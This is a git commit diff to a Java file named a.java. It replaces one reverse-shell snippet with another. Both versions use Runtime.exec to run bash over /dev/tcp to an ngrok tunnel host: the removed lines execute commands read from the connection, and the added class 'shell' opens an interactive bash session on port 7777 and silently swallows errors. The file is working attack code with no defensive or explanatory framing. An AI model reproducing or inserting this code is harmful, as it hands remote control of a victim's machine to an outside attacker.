c7ffcbdac704e06bbbd530948fbc62a29d30d21b
Ayush Srivastava <32226567+ayushsinha30@users.noreply.github.com>
2024-07-19 12:57:50 +0530

    Update a.java

--- a.java
+++ a.java
@@ -1,3 +1,10 @@
-Runtime r = Runtime.getRuntime();
-Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/a438-202-83-18-79.ngrok-free.app/443;cat <&5 | while read line; do $line 2>&5 >&5; done'");
-p.waitFor();
+public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/a438-202-83-18-79.ngrok-free.app/7777 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
